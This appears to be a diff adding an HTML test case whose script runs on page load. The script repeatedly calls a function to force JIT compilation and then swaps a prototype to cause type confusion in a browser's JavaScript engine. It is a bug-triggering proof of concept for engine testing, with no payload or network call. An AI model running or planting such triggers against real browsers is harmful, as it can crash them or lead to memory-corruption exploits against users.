@@ -1,0 +1,39 @@
+<style>
+body { display: table }
+</style>
+<script>
+function freememory(OwO) {
+  convNig(OwO = {});
+  console.warn(OwO);
+}
+function inlinee() { }
+function convNig(arr) {
+    arr[0] = 0xff;
+    new inlinee();
+    arr[0] += 0x18;
+}
+function main() {
+    for (let i = 0; i < 10000; i++) {
+        convNig(new Function(''));  // Prevents to be in-lined
+    }
+	let arr = [];
+	arr[0] = 0x00;
+	arr = arr; //Needs to be here
+	console.log('BEFORE: ' + arr);
+    for (let i = 0; i < 10000; i++) {
+        inlinee.prototype = {};
+        convNig(arr);
+    }
+	inlinee.prototype = arr;
+    console.log('AFTER: ' + arr);
+    freememory(arr);
+}
+function go() {
+  main();
+}
+</script>
+<body onload=go()>
+<table>
+<th>:D</th>
+</table>
+<progress>OwO</progress>
